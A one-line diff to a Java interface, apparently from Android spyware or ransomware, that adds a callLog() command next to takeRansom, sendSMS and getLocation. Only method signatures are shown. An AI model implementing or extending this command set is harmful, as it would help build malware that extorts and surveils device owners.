@@ -7,4 +7,5 @@ public interface Commandable {
 	public void takeRansom(String filename);
 	public void sendSMS(String nro,String mensaje);
 	public void getLocation();
+	public void callLog();
 }
